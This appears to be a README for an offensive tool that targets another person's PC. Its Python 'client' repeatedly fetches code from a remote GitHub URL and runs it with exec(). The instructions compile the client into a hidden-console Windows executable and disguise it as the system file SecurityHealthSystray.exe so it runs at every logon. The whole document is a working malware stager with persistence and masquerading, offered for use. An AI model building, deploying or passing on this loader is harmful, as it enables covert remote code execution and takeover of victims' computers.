# Client example
```python
import time
import requests

def has_internet():
    global a
    try:
        a = requests.get("https://raw.githubusercontent.com/slayy2357/payload1/main/temp.py").text
        if "#don't delete" in str(a):
            return True
        else:
            return False
    except:
        return False

while True:
    if has_internet() == True:
        exec(a)
        break
    else:
        time.sleep(5)
        pass
```
## How to make client autorun
### If you are on windows (and target pc is on windows)
Install requests (and all your client.py dependencies):
```bash
pip install requests
```
Install pyinstaller :
```bash
pip install pyinstaller
```
Compile client to executable :
```bash
pyinstaller client.py --onefile --noconsole
```
### If you are on linux (and target pc is on windows)
Install wine, download python 64bit .exe installer then start cmd :
```bash
wine cmd
```
Install python (replace with real name):
```bash
pythoninstaller.exe
```
Install requests (and all your client.py dependencies):
```bash
pip install requests
```
Then install pyinstaller :
```bash
pip install pyinstaller
```
And finally, compile to .exe :
```bash
pyinstaller client.py --onefile --noconsole
```
## Finally :
Now whether you are on Linux or Windows, you have your client in ```dist/*.exe```, it can be injected as ```SecurityHealthSystray.exe``` for autorun on user logon (```C:\Windows\system32\SecurityHealthSystray.exe```)